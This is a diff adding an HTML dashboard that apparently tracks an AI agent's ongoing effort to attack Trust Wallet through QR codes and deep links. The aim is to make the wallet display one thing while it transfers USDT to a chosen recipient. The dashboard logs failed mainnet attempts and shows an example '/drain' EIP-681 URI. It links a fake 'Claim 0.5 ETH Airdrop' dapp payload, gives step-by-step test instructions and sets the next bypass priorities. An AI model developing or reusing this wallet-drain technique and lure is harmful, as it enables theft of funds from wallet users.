@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>TW QR Attack — Investigation Portal</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0d1117; color: #e6edf3; padding: 20px; max-width: 900px; margin: 0 auto; }
+    h1 { font-size: 24px; color: #f0883e; display: flex; align-items: center; gap: 10px; margin-bottom: 4px; }
+    .subtitle { font-size: 13px; color: #8b949e; margin-bottom: 20px; }
+    .status-bar { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 20px; }
+    .badge { padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: 600; }
+    .badge.red { background: #da3633; color: white; }
+    .badge.green { background: #238636; color: white; }
+    .badge.yellow { background: #d29922; color: #0d1117; }
+    .badge.gray { background: #21262d; color: #8b949e; }
+    .section { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
+    .section h2 { font-size: 15px; color: #f0883e; margin-bottom: 10px; }
+    .section h3 { font-size: 13px; color: #c9d1d9; margin: 12px 0 6px; }
+    .section p, .section li { font-size: 12px; color: #c9d1d9; line-height: 1.6; }
+    .section code { background: #0d1117; padding: 1px 5px; border-radius: 3px; font-size: 11px; color: #7ee787; word-break: break-all; }
+    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+    .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
+    .card-link { background: #0d1117; border: 1px solid #21262d; border-radius: 8px; padding: 12px; text-decoration: none; display: block; transition: border-color 0.15s; }
+    .card-link:hover { border-color: #f0883e; }
+    .card-link .label { font-size: 9px; color: #8b949e; text-transform: uppercase; letter-spacing: 0.5px; }
+    .card-link .title { font-size: 13px; color: #e6edf3; margin-top: 2px; font-weight: 600; }
+    .card-link .desc { font-size: 11px; color: #8b949e; margin-top: 2px; }
+    .card-link .status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 4px; }
+    .dot-red { background: #da3633; }
+    .dot-green { background: #238636; }
+    .dot-yellow { background: #d29922; }
+    .dot-gray { background: #484f58; }
+    .resume-box { background: #0d1117; border: 2px solid #f0883e; border-radius: 12px; padding: 16px; margin-top: 16px; }
+    .resume-box h3 { color: #f0883e; font-size: 14px; margin-bottom: 8px; }
+    .resume-box code { display: block; background: #161b22; padding: 10px; border-radius: 6px; font-size: 12px; margin: 6px 0; color: #7ee787; border: 1px solid #21262d; word-break: break-all; }
+    .btn { display: inline-block; padding: 8px 16px; border-radius: 8px; font-size: 13px; font-weight: 600; text-decoration: none; margin: 4px 2px; }
+    .btn-orange { background: #f0883e; color: #0d1117; }
+    .btn-blue { background: #1f6feb; color: white; }
+    .btn-gray { background: #21262d; color: #e6edf3; border: 1px solid #30363d; }
+    hr { border: none; border-top: 1px solid #21262d; margin: 12px 0; }
+    .timestamp { font-size: 10px; color: #484f58; margin-top: 20px; text-align: center; }
+    @media (max-width: 600px) { .grid-2, .grid-3 { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+  <h1>🔬 TW QR Attack</h1>
+  <p class="subtitle">Investigation Portal — Display/Execution Mismatch</p>
+
+  <div class="status-bar">
+    <span class="badge red">EIP-681 data: BLOCKED</span>
+    <span class="badge yellow">Dapp browser: UNTESTED</span>
+    <span class="badge green">Portal: ACTIVE</span>
+    <span class="badge gray">Profile: company-scout</span>
+  </div>
+
+  <!-- RESUME SECTION -->
+  <div class="resume-box">
+    <h3>▶ Resume Investigation</h3>
+    <p style="font-size: 12px; color: #c9d1d9; margin-bottom: 8px;">
+      To resume this session, load the skill and open this portal:
+    </p>
+    <code>skill_view wallet-attack-investigation</code>
+    <code># Then open this page: portal is live = loaded</code>
+    <p style="font-size: 12px; color: #c9d1d9; margin-top: 8px;">
+      <strong>Next test priority:</strong> Scan v14 Test B (dapp browser, manual click) → v13 Test A (EIP-681 definitive) → older TW version
+    </p>
+    <div style="margin-top: 10px;">
+      <a class="btn btn-orange" href="https://htmlpreview.github.io/?https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/mainnet-v14-dapp-browser.html" target="_blank">▶ Test v14 (Dapp Browser)</a>
+      <a class="btn btn-blue" href="https://htmlpreview.github.io/?https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/mainnet-v13-definitive.html" target="_blank">▶ Test v13 (EIP-681)</a>
+      <a class="btn btn-gray" href="https://htmlpreview.github.io/?https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/INVESTIGATION_SUMMARY.md" target="_blank">📋 Full Summary</a>
+    </div>
+  </div>
+
+  <!-- TEST PAGES -->
+  <div class="section">
+    <h2>🧪 Test Pages</h2>
+    <div class="grid-3">
+
+      <a class="card-link" href="https://htmlpreview.github.io/?https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/mainnet-v14-dapp-browser.html" target="_blank">
+        <div class="label"><span class="status-dot dot-yellow"></span>UNTESTED — HIGH POTENTIAL</div>
+        <div class="title">v14 — Dapp Browser</div>
+        <div class="desc">trust://browser + eth_sendTransaction. Bypasses EIP-681 parser entirely. Web3 provider gives full data control.</div>
+      </a>
+
+      <a class="card-link" href="https://htmlpreview.github.io/?https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/mainnet-v13-definitive.html" target="_blank">
+        <div class="label"><span class="status-dot dot-red"></span>TESTED — DATA STRIPPED</div>
+        <div class="title">v13 — EIP-681 Definitive</div>
+        <div class="desc">7 QRs with exact user insight format. ERC20Transfer strips data. Verify yourself.</div>
+      </a>
+
+      <a class="card-link" href="https://htmlpreview.github.io/?https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/mainnet-transfer-4.html" target="_blank">
+        <div class="label"><span class="status-dot dot-gray"></span>ORIGINAL</div>
+        <div class="title">QR Generator</div>
+        <div class="desc">Form-based generator for /transfer?address+uint256+data URIs. Dynamic.</div>
+      </a>
+
+      <a class="card-link" href="https://htmlpreview.github.io/?https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/mainnet-v9-static.html" target="_blank">
+        <div class="label"><span class="status-dot dot-red"></span>TESTED — FAILED</div>
+        <div class="title">v9 — Static EIP-681</div>
+        <div class="desc">8 static tests: wei, data-first, /approve, trust://. All data stripped.</div>
+      </a>
+
+      <a class="card-link" href="https://htmlpreview.github.io/?https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/mainnet-v10-value-zero.html" target="_blank">
+        <div class="label"><span class="status-dot dot-red"></span>TESTED — BLOCKED</div>
+        <div class="title">v10 — value=0</div>
+        <div class="desc">value=0 to bypass pre-check. "Transaction likely to fail" blocked.</div>
+      </a>
+
+      <a class="card-link" href="https://htmlpreview.github.io/?https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/mainnet-v7-value-data.html" target="_blank">
+        <div class="label"><span class="status-dot dot-red"></span>TESTED — FAILED</div>
+        <div class="title">v7 — Value + Data</div>
+        <div class="desc">Added ETH values to enable confirm. Showed ETH not USDT.</div>
+      </a>
+
+    </div>
+  </div>
+
+  <!-- KEY FINDINGS -->
+  <div class="section">
+    <h2>📌 Key Findings</h2>
+    <div class="grid-2">
+      <div>
+        <h3>❌ ERC20Transfer has NO data field</h3>
+        <p>Wallet-core proto for token transfers has no <code>bytes data</code> field. Any <code>data</code> in EIP-681 URI is stripped during transaction building. This is the root cause of all failures.</p>
+      </div>
+      <div>
+        <h3>✅ Transfer/ContractGeneric HAVE data fields</h3>
+        <p>Native ETH transfer and generic contract interaction protos both carry <code>bytes data</code>. But when these routes are triggered, the wallet shows ETH amounts (not USDT), defeating the display mismatch.</p>
+      </div>
+      <div>
+        <h3>⚠️ v5/C — Closest to Working</h3>
+        <p><code>ethereum:0xUSDT@1/drain?address=RCP&uint256=1M&data=...</code> — transaction EXECUTED ($0.04 gas paid) but data was stripped → no USDT moved. Proves confirm works for generic paths.</p>
+      </div>
+      <div>
+        <h3>💡 Dapp Browser = Best Remaining Angle</h3>
+        <p><code>trust://browser?url=dapp-payload.html</code> opens TW's dapp browser with Web3 provider. The dapp sends <code>eth_sendTransaction</code> directly — no EIP-681 parser, no data loss. <strong>Untested as of 2026-07-02</strong>.</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- DAPP PAYLOAD -->
+  <div class="section">
+    <h2>🌐 Dapp Payload</h2>
+    <p>The dapp page loaded by v14 QRs. Auto-requests transaction or waits for button click.</p>
+    <div style="margin-top: 8px;">
+      <a class="btn btn-blue" href="https://htmlpreview.github.io/?https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/dapp-payload.html" target="_blank">View dapp-payload.html</a>
+      <code style="display: inline-block; margin-left: 8px; font-size: 11px;">trust://browser?url=https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/dapp-payload.html</code>
+    </div>
+    <hr>
+    <h3>How to test the dapp browser:</h3>
+    <ol style="margin-left: 16px;">
+      <li>Open v14 page → scan QR <strong>Test B</strong> (manual click) with built-in camera</li>
+      <li>Trust Wallet opens dapp browser showing "Claim 0.5 ETH Airdrop"</li>
+      <li>Tap <strong>"Claim Airdrop"</strong> button → wallet requests transaction</li>
+      <li><strong>READ what wallet shows:</strong> to=0xUSDT, value=0 ETH, data=transfer(RCP,4M)</li>
+      <li>If it shows the USDT transfer → the dapp approach WORKS. Approve and check USDT balance.</li>
+    </ol>
+  </div>
+
+  <!-- ARCHIVED PAGES -->
+  <div class="section">
+    <h2>📦 Archived/Historical Pages</h2>
+    <p style="font-size: 11px; color: #8b949e; margin-bottom: 8px;">These pages are from earlier iterations. Included for completeness but superseded by v13/v14.</p>
+    <div class="grid-3">
+      <a class="card-link" href="https://htmlpreview.github.io/?https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/amount-data-test.html" target="_blank"><div class="title">amount-data-test</div><div class="desc">trust:// amount + data</div></a>
+      <a class="card-link" href="https://htmlpreview.github.io/?https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/mainnet-v2-no-address.html" target="_blank"><div class="title">v2 — No Address</div><div class="desc">trust:// w/o address</div></a>
+      <a class="card-link" href="https://htmlpreview.github.io/?https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/mainnet-v3-final-angles.html" target="_blank"><div class="title">v3 — Final Angles</div><div class="desc">memo, dup, value confusion</div></a>
+      <a class="card-link" href="https://htmlpreview.github.io/?https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/mainnet-v4-contract-generic.html" target="_blank"><div class="title">v4 — Contract Generic</div><div class="desc">trust:// no asset</div></a>
+      <a class="card-link" href="https://htmlpreview.github.io/?https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/mainnet-v5-android-focus.html" target="_blank"><div class="title">v5 — Android Focus</div><div class="desc">value + data, /drain</div></a>
+      <a class="card-link" href="https://htmlpreview.github.io/?https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/mainnet-v6-android-pure-data.html" target="_blank"><div class="title">v6 — Pure Data</div><div class="desc">data only, all formats</div></a>
+      <a class="card-link" href="https://htmlpreview.github.io/?https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/mainnet-v8-wei-params.html" target="_blank"><div class="title">v8 — Wei Params</div><div class="desc">wei ints, param order, /approve</div></a>
+      <a class="card-link" href="https://htmlpreview.github.io/?https://raw.githubusercontent.com/strystark-hash/tw-qr-attack-test-suite/main/mainnet-v11-dapp-browser.html" target="_blank"><div class="title">v11 — Dapp Browser</div><div class="desc">First dapp attempt (QRs broken)</div></a>
+    </div>
+  </div>
+
+  <!-- COMMANDS -->
+  <div class="section">
+    <h2>⌨️ Resume Commands</h2>
+    <p style="font-size: 12px; color: #c9d1d9; margin-bottom: 8px;">Copy-paste these to resume the investigation in a new session:</p>
+    <code style="display: block; margin-bottom: 6px;">skill_view wallet-attack-investigation</code>
+    <code style="display: block; margin-bottom: 6px;"># Review INVESTIGATION_SUMMARY.md for full context</code>
+    <code style="display: block; margin-bottom: 6px;"># Test priority: v14 (dapp browser) → v13 (EIP-681) → older TW version</code>
+    <code style="display: block;"># Report: what wallet shows? Confirm enabled? USDT moved?</code>
+  </div>
+
+  <div class="timestamp">
+    Investigation Portal v1.0 · Last updated 2026-07-02 · Profile: company-scout
+  </div>
+</body>
+</html>
